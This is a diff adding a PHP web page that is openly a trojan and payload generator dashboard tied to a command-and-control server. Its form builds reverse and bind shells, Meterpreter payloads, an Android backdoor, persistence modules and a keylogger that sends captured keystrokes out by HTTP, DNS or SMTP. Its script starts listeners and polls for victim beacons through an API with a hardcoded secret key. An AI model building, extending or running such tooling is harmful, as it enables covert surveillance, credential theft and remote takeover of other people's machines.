@@ -1,0 +1,292 @@
+<?php
+/**
+ * Trojan / Advanced Payload Generator Dashboard v5.0
+ * Supports Keylogger backdoor generation for all OS, with post-generation status and listener integration.
+ */
+
+$advanced_mode = isset($_GET['advanced']) ? true : false;
+$preset_type   = $_GET['type'] ?? '';
+
+if ($advanced_mode) {
+    if (file_exists(__DIR__ . '/../system/modules/AdvancedPayloadModule.php')) {
+        require_once __DIR__ . '/../system/modules/AdvancedPayloadModule.php';
+        if (class_exists('AdvancedPayloadModule')) {
+            $payload_module = new AdvancedPayloadModule();
+            $module_name = 'AdvancedPayloadModule v5.0';
+            $is_advanced = true;
+        } else {
+            die('<div style="background:#0a0a0a; color:#ff0000; padding:20px;">ERROR: AdvancedPayloadModule class not found.</div>');
+        }
+    } else {
+        die('<div style="background:#0a0a0a; color:#ff0000; padding:20px;">ERROR: AdvancedPayloadModule.php not found.</div>');
+    }
+} else {
+    require_once __DIR__ . '/includes/EnhancedModuleLoader.php';
+    $loader = EnhancedModuleLoader::getInstance();
+    if ($loader->isAvailable()) {
+        if (file_exists(__DIR__ . '/../system/modules/TrojanModule.php')) {
+            require_once __DIR__ . '/../system/modules/TrojanModule.php';
+            $payload_module = new EnhancedTrojanModule();
+            $module_name = 'EnhancedTrojanModule v2.0';
+            $is_advanced = false;
+        } else {
+            die('TrojanModule.php not found.');
+        }
+    } else {
+        die('Trojan module not available: ' . $loader->getError());
+    }
+}
+
+// Handle form submission
+$generated = null;
+$error = null;
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['generate'])) {
+    $cfg = [
+        'type'     => $_POST['type'] ?? ($is_advanced ? 'meterpreter_reverse_tcp' : 'reverse_shell'),
+        'platform' => $_POST['platform'] ?? 'linux',
+        'format'   => $_POST['format'] ?? ($is_advanced && $_POST['platform'] === 'android' ? 'apk' : 'sh'),
+        'lhost'    => $_POST['lhost'] ?? '127.0.0.1',
+        'lport'    => (int)($_POST['lport'] ?? 4444),
+        'extra'    => [
+            'c2_enabled' => isset($_POST['c2_enabled']) ? true : false,
+            'exfil_method' => $_POST['exfil_method'] ?? 'http',
+            'log_path'     => $_POST['log_path'] ?? '/tmp/.keys.log',
+            'interval'     => (int)($_POST['interval'] ?? 60)
+        ]
+    ];
+    try {
+        $generated = $payload_module->generate_payload($cfg);
+    } catch (Exception $e) {
+        $error = $e->getMessage();
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo $advanced_mode ? '🧬 Advanced Payload Generator v5.0' : '🏴‍☠️ Trojan Generator'; ?></title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/cosmic-c2.css">
+    <style>
+        .container { max-width:800px; margin:0 auto; }
+        .info { background:rgba(0,255,0,0.1); border:1px solid #00ff00; padding:15px; margin:20px 0; border-radius:5px; }
+        .form-group { margin-bottom:15px; }
+        label { display:block; color:#00ffff; margin-bottom:5px; }
+        input, select, textarea { width:100%; padding:8px; background:#000; color:#00ff00; border:1px solid #00ff00; border-radius:4px; font-family:inherit; }
+        .btn { background:#000; color:#00ff00; border:2px solid #00ff00; padding:10px 20px; cursor:pointer; font-size:16px; transition:0.3s; margin:5px; }
+        .btn:hover { background:#00ff00; color:#000; }
+        .btn-primary { border-color:#0ff; color:#0ff; }
+        .btn-primary:hover { background:#0ff; color:#000; }
+        .result { background:rgba(0,0,0,0.9); border:2px solid #00ffff; padding:15px; margin-top:30px; border-radius:5px; }
+        .error { color:#ff0000; border-color:#ff0000; }
+        a { color:#00ffff; text-decoration:none; }
+        a:hover { text-decoration:underline; }
+    </style>
+</head>
+<body class="cosmic-scroll-body">
+    <div class="container">
+        <h1><?php echo $advanced_mode ? '🧬 Advanced Payload Generator v5.0' : '🏴‍☠️ Trojan Generator v2.0'; ?></h1>
+        <div class="info">
+            <strong>Module:</strong> <?php echo $module_name; ?><br>
+            <strong>Mode:</strong> <?php echo $advanced_mode ? 'Keylogger / Meterpreter / APK / C2' : 'Standard'; ?>
+        </div>
+
+        <form method="post">
+            <div class="form-group">
+                <label>LHOST (attacker IP / domain):</label>
+                <input type="text" name="lhost" placeholder="192.168.1.100" value="<?php echo htmlspecialchars($_POST['lhost'] ?? ''); ?>" required>
+            </div>
+            <div class="form-group">
+                <label>LPORT:</label>
+                <input type="number" name="lport" placeholder="4444" value="<?php echo htmlspecialchars($_POST['lport'] ?? '4444'); ?>" required>
+            </div>
+            <div class="form-group">
+                <label>Payload Type:</label>
+                <select name="type">
+                    <?php if ($advanced_mode): ?>
+                        <option value="meterpreter_reverse_tcp" <?php echo $preset_type==='meterpreter'?'selected':''; ?>>Meterpreter Reverse TCP</option>
+                        <option value="android_backdoor_full"   <?php echo $preset_type==='android'?'selected':''; ?>>Android APK Backdoor</option>
+                        <option value="persistence"            <?php echo $preset_type==='persistence'?'selected':''; ?>>Persistence Module</option>
+                        <option value="keylogger"              <?php echo ($preset_type==='keylogger'||$preset_type==='')?'selected':''; ?>>Cross‑Platform Keylogger</option>
+                    <?php else: ?>
+                        <option value="reverse_shell">Reverse Shell</option>
+                        <option value="bind_shell">Bind Shell</option>
+                    <?php endif; ?>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Platform:</label>
+                <select name="platform">
+                    <option value="linux">Linux</option>
+                    <option value="windows">Windows</option>
+                    <?php if ($advanced_mode): ?>
+                    <option value="macos">macOS</option>
+                    <option value="android">Android</option>
+                    <?php endif; ?>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Format / Language:</label>
+                <select name="format">
+                    <option value="sh">Shell Script (.sh)</option>
+                    <option value="py">Python (.py)</option>
+                    <option value="ps1">PowerShell (.ps1)</option>
+                    <?php if ($advanced_mode): ?>
+                    <option value="vbs">VBScript (.vbs)</option>
+                    <option value="applescript">AppleScript (.applescript)</option>
+                    <option value="apk">Android APK (.apk)</option>
+                    <?php endif; ?>
+                </select>
+            </div>
+            
+            <?php if ($advanced_mode): ?>
+            <div class="form-group">
+                <label>🧠 C2 Integration:</label>
+                <label style="display:inline; margin-left:10px;">
+                    <input type="checkbox" name="c2_enabled" value="1" checked> Enable C2 beaconing
+                </label>
+                <small style="display:block; color:#888;">Payload will phone home to /c2/beacon.php?uuid=...</small>
+            </div>
+            
+            <?php if (isset($_POST['type']) && $_POST['type'] === 'keylogger'): ?>
+            <div class="form-group">
+                <label>Exfiltration Method:</label>
+                <select name="exfil_method">
+                    <option value="http">HTTP POST</option>
+                    <option value="dns">DNS (simulated)</option>
+                    <option value="smtp">SMTP</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Log File Path (on target):</label>
+                <input type="text" name="log_path" value="/tmp/.keys.log">
+            </div>
+            <div class="form-group">
+                <label>Upload Interval (seconds):</label>
+                <input type="number" name="interval" value="60" min="1">
+            </div>
+            <?php endif; ?>
+            <?php endif; ?>
+            
+            <button type="submit" name="generate" class="btn btn-primary">🚀 Generate Payload</button>
+        </form>
+
+        <?php if ($error): ?>
+        <div class="result" style="border-color:#ff0000;">
+            <h3 style="color:#ff0000;">❌ Generation Failed</h3>
+            <pre><?php echo htmlspecialchars($error); ?></pre>
+        </div>
+        <?php endif; ?>
+
+        <!-- POST-GENERATION SECTION (replaced by script) -->
+        <?php if ($generated): ?>
+        <div class="result" id="generation-result">
+            <h3 style="color:#00ff00;">✅ Payload Generated Successfully</h3>
+            <p><strong>Filename:</strong> <?php echo htmlspecialchars($generated['filename']); ?></p>
+            <p><strong>Path:</strong> <?php echo htmlspecialchars($generated['path']); ?></p>
+            <p><strong>Size:</strong> <?php echo $generated['size']; ?> bytes</p>
+            <p><strong>SHA256:</strong> <code style="background:#000; color:#0ff;"><?php echo $generated['hash']['sha256']; ?></code></p>
+            <?php if (isset($generated['warning'])): ?>
+            <p style="color:#ffff00;"><strong>Warning:</strong> <?php echo htmlspecialchars($generated['warning']); ?></p>
+            <?php endif; ?>
+            
+            <!-- POST‑GENERATION ACTIONS -->
+            <div style="margin-top:30px; padding:20px; background:rgba(0,255,0,0.05); border:1px solid #0f0; border-radius:8px;">
+                <h4 style="color:#0ff; margin-top:0;">🚀 Next Steps</h4>
+                
+                <!-- Listener Creation Section -->
+                <div id="listener-section">
+                    <p><strong>Listener for this payload:</strong> (LHOST: <?php echo htmlspecialchars($generated['config']['lhost']); ?>, LPORT: <?php echo $generated['config']['lport']; ?>)</p>
+                    <button class="btn" onclick="createListener('<?php echo $generated['config']['lhost']; ?>', <?php echo $generated['config']['lport']; ?>)">🎧 Create Listener</button>
+                    <div id="listener-status" style="margin-top:15px;"></div>
+                </div>
+                
+                <!-- Connection Status -->
+                <div id="connection-section" style="margin-top:20px; display:none;">
+                    <h5 style="color:#0f0;">📡 Payload Connection Status</h5>
+                    <div id="connection-status">Waiting for first beacon...</div>
+                    <div id="c2-link" style="margin-top:15px; display:none;">
+                        <a href="c2-dashboard.php?view=payloads&uuid=<?php echo $generated['c2_uuid'] ?? ''; ?>" class="btn btn-primary">🎮 Go to C2 Dashboard</a>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Download Button -->
+            <div style="margin-top:20px;">
+                <a href="<?php echo $generated['download_url']; ?>" class="btn btn-primary">💾 Download Payload</a>
+                <a href="?advanced=1" class="btn">🔄 Generate Another</a>
+            </div>
+        </div>
+        
+        <script>
+        let payloadUuid = '<?php echo $generated['c2_uuid'] ?? ''; ?>';
+        let checkInterval = null;
+        
+        function createListener(lhost, lport) {
+            document.getElementById('listener-status').innerHTML = 'Starting listener...';
+            fetch('/c2/api/index.php?action=create_listener&key=COSMIC-C2-SECRET-2026', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `name=Payload_Listener_${lport}&lhost=${lhost}&lport=${lport}&protocol=tcp`
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    document.getElementById('listener-status').innerHTML = '<span style="color:#0f0;">✅ Listener created (ID: ' + data.listener_id + '). Starting...</span>';
+                    // Now start the listener
+                    return fetch('/c2/api/index.php?action=start_listener&key=COSMIC-C2-SECRET-2026', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `id=${data.listener_id}`
+                    });
+                } else {
+                    document.getElementById('listener-status').innerHTML = '<span style="color:#f00;">❌ Failed to create listener: ' + data.message + '</span>';
+                }
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data && data.status === 'ok') {
+                    document.getElementById('listener-status').innerHTML = '<span style="color:#0f0;">✅ Listener running (PID: ' + data.pid + '). Waiting for payload connection...</span>';
+                    // Show connection section and start polling for beacons
+                    document.getElementById('connection-section').style.display = 'block';
+                    startPolling();
+                } else if (data) {
+                    document.getElementById('listener-status').innerHTML = '<span style="color:#f00;">❌ Failed to start listener: ' + data.message + '</span>';
+                }
+            })
+            .catch(err => {
+                document.getElementById('listener-status').innerHTML = '<span style="color:#f00;">❌ Error: ' + err + '</span>';
+            });
+        }
+        
+        function startPolling() {
+            if (!payloadUuid) {
+                document.getElementById('connection-status').innerHTML = '<span style="color:#ff0;">⚠️ Payload not C2‑enabled – no beacon tracking.</span>';
+                return;
+            }
+            checkInterval = setInterval(() => {
+                fetch('/c2/api/index.php?action=beacons&uuid=' + payloadUuid + '&key=COSMIC-C2-SECRET-2026')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'ok' && data.data.length > 0) {
+                        document.getElementById('connection-status').innerHTML = '<span style="color:#0f0;">✅ Payload connected! Last beacon: ' + new Date(data.data[0].beacon_time * 1000).toLocaleString() + '</span>';
+                        document.getElementById('c2-link').style.display = 'block';
+                        clearInterval(checkInterval);
+                    }
+                });
+            }, 5000); // Check every 5 seconds
+        }
+        
+        // If payload already has a UUID (C2 enabled), start polling immediately
+        <?php if (!empty($generated['c2_uuid'])): ?>
+        document.getElementById('connection-section').style.display = 'block';
+        startPolling();
+        <?php endif; ?>
+        </script>
+        
+        <?php endif; ?>
+    </div>
+</body>
+</html>
